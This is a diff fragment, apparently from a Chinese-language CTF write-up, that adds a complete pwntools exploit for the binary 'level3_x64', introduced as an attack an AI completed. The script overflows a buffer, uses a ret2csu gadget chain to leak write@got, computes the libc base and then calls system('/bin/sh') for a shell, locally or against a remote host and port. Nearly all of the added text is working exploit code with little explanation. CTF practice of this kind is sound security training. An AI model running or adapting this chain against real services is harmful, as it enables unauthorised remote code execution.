@@ -92,3 +92,76 @@ p.recvuntil(b"Input:\n")
 p.send(payload)
 p.interactive()
 ```
+
+AI 完成的攻击，思路类似，不过用了 ret2csu 的 gadget：
+
+```python
+from pwn import *
+
+binary = ELF('./level3_x64')
+libc = ELF('./libc.so.6')
+
+write_got = binary.got['write']
+vuln_func = binary.symbols['vulnerable_function']
+
+csu_pop = 0x4006aa
+csu_call = 0x400690
+pop_rdi = 0x4006b3
+ret = 0x4006b4
+
+write_off = libc.symbols['write']
+system_off = libc.symbols['system']
+binsh_off = next(libc.search(b'/bin/sh'))
+
+def exploit(host=None, port=None):
+    if host:
+        p = remote(host, port)
+    else:
+        p = process('./level3_x64.patched')
+
+    # Stage 1: leak write@got via ret2csu
+    payload = b'A' * 0x80
+    payload += b'B' * 8
+    payload += p64(csu_pop)
+    payload += p64(0)           # rbx = 0
+    payload += p64(1)           # rbp = 1
+    payload += p64(write_got)   # r12 = write@got
+    payload += p64(8)           # r13 = rdx = 8
+    payload += p64(write_got)   # r14 = rsi = write@got
+    payload += p64(1)           # r15 = edi = 1
+    payload += p64(csu_call)
+    payload += p64(0) * 7
+    payload += p64(vuln_func)
+
+    p.recvuntil(b'Input:\n')
+    p.send(payload)
+
+    leaked_write = u64(p.recv(8).ljust(8, b'\x00'))
+    log.info(f"Leaked write: {hex(leaked_write)}")
+
+    libc_base = leaked_write - write_off
+    log.info(f"Libc base: {hex(libc_base)}")
+
+    system = libc_base + system_off
+    binsh = libc_base + binsh_off
+
+    # Stage 2: system("/bin/sh") with stack alignment
+    payload2 = b'A' * 0x80
+    payload2 += b'B' * 8
+    payload2 += p64(ret)      # stack alignment
+    payload2 += p64(pop_rdi)
+    payload2 += p64(binsh)
+    payload2 += p64(system)
+
+    p.recvuntil(b'Input:\n')
+    p.send(payload2)
+
+    p.interactive()
+
+if __name__ == '__main__':
+    import sys
+    if len(sys.argv) > 2:
+        exploit(sys.argv[1], int(sys.argv[2]))
+    else:
+        exploit()
+```
